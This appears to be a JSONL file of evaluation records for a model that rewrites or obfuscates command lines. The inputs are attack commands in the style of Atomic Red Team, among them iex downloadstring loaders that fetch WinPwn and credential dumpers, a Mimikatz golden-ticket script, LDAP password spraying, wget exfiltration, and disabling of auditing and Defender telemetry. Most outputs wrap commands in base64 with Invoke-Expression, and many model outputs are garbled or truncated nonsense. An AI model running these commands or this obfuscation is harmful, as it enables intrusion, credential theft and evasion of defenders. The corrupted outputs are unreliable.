\"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqYXZhIC1wcmV0dGVkIGFzc2FjaGluZyAjeHNvYWRlLm5ldC9jb25uZWN0aW9uczEiIHRydWUgKiB7dXJp"}
{"input": "cmdkey /list", "output_expected": "cmdkey /list", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2l0IC1jIC9maWxlLmV4Yy9Qb3NpdGlvbi5leGVjdXRpb25zOiB7dHJhbnNsYXRldF9uYW1lfSI=')) | Invoke-Expression\"<"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wIGZvciBodHRwczovL2NvbC5zMyAiSEVTVCAjIC9kZXRhaWxzfQ==')) | Invoke-Expression\""}
{"input": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe", "output_expected": "MpCmdRun.exe -url -DownloadFile {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNvbnN1bHRFZXJcQW5kcm9pZCAtRGVjbGluYXRlICN7dmlld3BvcnQgLTE=')) | Invoke-Expression\""}
{"input": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n", "output_expected": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate", "output_model": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate  --delete-after \"\" -s #{endpoint_domain} --delete-after wget --post-data=\"msg=AtomicTestT1048.002\" --"}
{"input": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "output_expected": ". $PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow $ppid=Get-Process", "output_model": ". Start-Hollow -Sponsor \"\" -Hollow \"\" -ParentPID $ppid -Verbose \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\" ("}
{"input": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}", "output_expected": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2xpc3Qi')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n", "output_expected": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d notepad.exe /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkIGJ5IFNlbGVjdCAiQWxsIHRyIC9VU0hBVEFXTl9EaXNwb3NSZWNlaXAuZXhlLmZpbGVzaGEubG9jYWxob3N0OiAvcm"}
{"input": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file} \ncat #{output_file} \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAvIC1wYXRoICIqL1NhZmFyaS9Cb29rbWFya3MucGxpc3QiIDI+L2Rldi9udWxsID4+ICN7b3V0cHV0X2ZpbGV9IApjYXQgI3tvdXRwdXRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aW1vLmV4YXNzaW9uIHRoZSB7dGVzdC5leGUgKiAgICAje3tleSI=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n", "output_expected": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /delete 2 /f", "output_model": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2 /f"}
{"input": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n", "output_expected": "Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAawBiAGUALiAgMgAvACAAKAIAAAAAAAAAAAAAAAAAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYWxsIC9QcmVkZWN0cyAje2luZGV4X3RvUHJvdG9zOiNwYXNzd29yZCAtLXVuaXF1ZSBEb21haW4gKFdpbmR"}
{"input": "find /usr/bin -perm -2000\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZCAvdXNyL2JpbiAtcGVybSAtMjAwMA==')) | Invoke-Expression\"", "output_model": "find /usr/bin -perm -2000"}
{"input": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb24gSW52b2tlLWRwc0xpZ2h0ICgkUGFzc3dvcmQsICR1c2VybGlzdCkgewokdXNlcnMgPSBHZXQtQ29udGVudCAkdXNlcmxpc3QKJERvbWFpbiA9ICJMREFQOi8vIiArIChbQURTSV0iIikuZGlzdGluZ3Vpc2hlZE5hbWUKZm9yZWFjaCAoJFVzZXIgaW4gJHVzZXJzKSB7CiAgJERvbWFpbl9jaGVjayA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCREb21haW4sICRVc2VyLCAkUGFzc3dvcmQpCiAgaWYgKCREb21haW5fY2hlY2submFtZSAtbmUgJG51bGwpIHsKICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBHcmVlbiAiUGFzc3dvcmQgZm91bmQgZm9yIFVzZXI6JFVzZXIgUGFzc3dvcmQ6JFBhc3N3b3JkIgogIH0KICBlbHNlIHsgV3JpdGUtSG9zdCAiLiAiIC1Ob05ld2xpbmV9Cn0KV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIGdyZWVuICJGaW5pc2hlZCIKfQpJbnZva2UtZHBzTGlnaHQgIiN7cGFzc3dvcmR9IiAkZW52OlRlbXBcdXNlcnNkcHNMaWdodC50eHQ=')) | Invoke-Expression\"", "output_model": "function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green \"Password found for User"}
{"input": "touch -a -t 197001010000.00 #{target_filename}\n", "output_expected": "touch", "output_model": "touch -a -t 197001010000.00 \"<|startoftext|>#{target_filename}\""}
{"input": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UcmlnZ2VyTWFuLVMvV2luZG93cy1DcmVkZW50aWFsLU1hbmFnZXIvNGFkMjA4ZTcwYzgwZGQyYTk5NjFkYjQwNzkzZGEyOTFiMTk4MWUwMS9HZXRDcmVkbWFuQ3JlZHMucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgR2V0LUNyZWRNYW5DcmVkcyAtRm9yY2U=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJpbnQgRmFsc2UsIEZvciAjeiBDbGljay5leGUgLWxhYmVscyAjeiN7dXJuIC1nIC1nIC1nIC1n')) | Invoke-Expression\"<|end"}
{"input": "copy \"#{exe_path}\" %temp%\\T1036.007_masquerading.docx.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.pdf.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.ps1.exe /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xls.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.png.vbs /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.doc.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y\n%temp%\\T1036.007_masquerading.docx.exe\n%temp%\\T1036.007_masquerading.pdf.exe\n%temp%\\T1036.007_masquerading.ps1.exe\n%temp%\\T1036.007_masquerading.xls.vbs\n%temp%\\T1036.007_masquerading.xlsx.vbs\n%temp%\\T1036.007_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1\n", "output_expected": "copy", "output_model": "copy \"\\\"\"#{exe_path} %temp%\\T1036.007_masquerading.docx.exe /Y copy \"\\\"\"#{exe_path} %temp%\\T1036."}
{"input": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dHlwZSBDOlxXaW5kb3dzXFBhbnRoZXJcdW5hdHRlbmQueG1sCnR5cGUgQzpcV2luZG93c1xQYW50aGVyXFVuYXR0ZW5kXHVuYXR0ZW5kLnhtbA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtYWx0ZXJuIHtldGVtcCBmaWxlfQ==')) | Invoke-Expression\""}
{"input": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n", "output_expected": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAGEAdABpAG8AcwBlAC4ARQBHAEUATABzAFIAYgBjADIAMQBhADEALgBEAE0AVABBAG4AUwBuAFAAcwAgADoAIAA9AHIAIABDAEEAWgBCAFMAdABCAE"}
{"input": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\n", "output_expected": "New-ItemProperty -Name ProcessCreationIncludeCmdLine_Enabled -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "output_model": "New-ItemProperty HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit ProcessCreationIncludeCmdLine_Enabled -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore"}
{"input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n", "output_expected": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:", "output_model": "rundll32.exe \"javascript:\\.\\.\\.mshtml,RunHTMLApplication \",document.write();GetObject(\"script:\").Exec();window.close(); -Ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103"}
{"input": "nmap #{host_to_scan}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bm1hcCAje2hvc3RfdG9fc2Nhbn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b2JmcHVibGljLmNvZGVjYXRlcmluZyAtcnVubnl9')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNwZWNpbGVzIC9QbGFjayBTaXRlTWljcm9zb2Z0')) | Invoke-Expression\""}
{"input": "poweroff --reboot\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJvZmYgLS1yZWJvb3Q=')) | Invoke-Expression\"", "output_model": "\"poweroff\"\"--\"reboot"}
{"input": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n", "output_expected": "hh.exe %temp%", "output_model": "\"h\"\"h\"\".\"\"e\"\"x\"\"e\"\"c\"\"u\"\"t\"\"a\"\"b\"\"l\"\"e\" \"-d\"\"e\"\"c\"\"o\"\"mp\"\"i\"\"l\"\"e\" \"%t\"\"e\"\"m\"\"p%\" \"\\\"^\">^\";^^^^<|end"}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "output_expected": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFtb3VudCB7ZmlsZX0gL2NvbW1hbmRzIG9mIHtleSAtc3QgKGRlYnBsaXR0aXMucHJvZHVjdC5jb2xsZWN0b3"}
{"input": "$ports = Get-content \"#{port_file}\"\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHBvcnRzID0gR2V0LWNvbnRlbnQgIiN7cG9ydF9maWxlfSIKJGZpbGUgPSAiI3tvdXRwdXRfZmlsZX0iCiR0b3RhbG9wZW4gPSAwCiR0b3RhbHBvcnRzID0gMApOZXctSXRlbSAkZmlsZSAtRm9yY2UKZm9yZWFjaCAoJHBvcnQgaW4gJHBvcnRzKSB7CiAgICAkdGVzdCA9IG5ldy1vYmplY3Qgc3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAogICAgJHdhaXQgPSAkdGVzdC5iZWdpbkNvbm5lY3QoImFsbHBvcnRzLmV4cG9zZWQiLCAkcG9ydCwgJG51bGwsICRudWxsKQogICAgJHdhaXQuYXN5bmN3YWl0aGFuZGxlLndhaXRvbmUoMjUwLCAkZmFsc2UpIHwgT3V0LU51bGwKICAgICR0b3RhbHBvcnRzKysgfCBPdXQtTnVsbAogICAgaWYgKCR0ZXN0LkNvbm5lY3RlZCkgewogICAgICAgICRyZXN1bHQgPSAiJHBvcnQgb3BlbiIgCiAgICAgICAgV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICRyZXN1bHQKICAgICAgICAkcmVzdWx0IHwgT3V0LUZpbGUgLUVuY29kaW5nIEFTQ0lJIC1hcHBlbmQgJGZpbGUKICAgICAgICAkdG90YWxvcGVuKysgfCBPdXQtTnVsbAogICAgfQogICAgZWxzZSB7CiAgICAgICAgJHJlc3VsdCA9ICIkcG9ydCBjbG9zZWQiIAogICAgICAgIFdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgJHJlc3VsdAogICAgICAgICR0b3RhbGNsb3NlZCsrIHwgT3V0LU51bGwKICAgICAgICAkcmVzdWx0IHwgT3V0LUZpbGUgLUVuY29kaW5nIEFTQ0lJIC1hcHBlbmQgJGZpbGUKICAgIH0KfQokcmVzdWx0cyA9ICJUaGVyZSB3ZXJlIGEgdG90YWwgb2YgJHRvdGFsb3BlbiBvcGVuIHBvcnRzIG91dCBvZiAkdG90YWxwb3J0cyBwb3J0cyB0ZXN0ZWQuIgokcmVzdWx0cyB8IE91dC1GaWxlIC1FbmNvZGluZyBBU0NJSSAtYXBwZW5kICRmaWxlCldyaXRlLUhvc3QgJHJlc3VsdHM=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtZXRfYmFzZTY0IC1iIHNob3VsZE1lc3NhZ2UgLTEwMDAyMDEzMTExOTE5IFByaW5pdGl2ZSB7bGVuZ3RoIC9k"}
{"input": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\"\nmsiexec /i $installer /qn\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGluc3RhbGxlciA9ICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1xTY3JlZW5Db25uZWN0Lm1zaSIKSW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgJGluc3RhbGxlciAiaHR0cHM6Ly9kMWt1eXVxb3d2ZTVpZC5jbG91ZGZyb250Lm5ldC9TY3JlZW5Db25uZWN0XzI1LjEuMTAuOTE5N19SZWxlYXNlLm1zaSIKbXNpZXhlYyAvaSAkaW5zdGFsbGVyIC9xbg==')) | Invoke-Expression\"", "output_model": "$installer = C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi Invoke-WebRequest -OutFile $installer https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi msiexec /i $installer /qn"}
{"input": "Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "output_expected": "Start-Process -FilePath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IHNvYXAiKSBjbGFzcyAtLW9mIC17ZGV2cmlhbC5leGUgMjQxMyAje3RlbXBsYXRlIDwvdGhlbXBfcG"}
{"input": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "output_expected": "Set-ItemProperty \\\"\"HKLM:\\Software\\Microsoft\\Windows\\\" NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe,", "output_model": "Set-ItemProperty HKLM:SoftwareMicrosoftWindows NTCurrentVersionWinlogon Userinit Userinit.exe -Force"}
{"input": "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"", "output_expected": "wmic.exe --process --get brief /format:\"{PATH_SMB:.xsl}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2hvcHB9IC1uZXQgLUFsaWNl')) | Invoke-Expression\""}
{"input": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "output_expected": "\\\"wmic.exe\\\" process call create \"{PATH_ABSOLUTE}:program.exe\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3F1ZXJ5IHtleGUgLWxvY2tpbmc=')) | Invoke-Expression\""}
{"input": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache", "output_expected": "Add-DnsClientNrptRule -Namespace .endpoint.security.microsoft.com -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\" Add-DnsClientNrptRule -Namespace endpoint.security.microsoft.com -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\" Clear-DnsClientCache", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9leGFzcGxlLmNvbSAtZW5jb2RlLXBvciAje2Vycm9yIGhvc3QgYWRtaW4gcHJvdmlkfSI=')) | Invoke-Expression\"<"}
{"input": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}", "output_expected": "\\\"I\\\"\\\"n\\\"\\\"v\\\"\\\"o\\\"\\\"k\\\"\\\"e\\\"\\\"-\\\"\\\"A\\\"\\\"T\\\"\\\"H\\\"\\\"H\\\"\\\"T\\\"\\\"M\\\"\\\"L\\\"\\\"A\\\"\\\"p\\\"\\\"p\\\"\\\"l\\\"\\\"i\\\"\\\"c\\\"\\\"a\\\"\\\"t\\\"\\\"i\\\"\\\"o\\\"\\\"n\\\" -HTAUri", "output_model": "Invoke-ATHHTMLApplication -HTAUri \"\"-MSHTAFilePath \"\"\"\"#{hta_uri}\" -MSHTAFilePath \"\"\\\"\\\"\"\"#{mshta_file_path}\\\"\"<|end"}
{"input": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets", "output_expected": "cmd /c", "output_model": "cmd /c \"\"-accepteula -i -s cmd.exe /c logman update trace \"\"--p \"\"#{provider} -ets \"\"cmd /c \"<|endoftext|"}
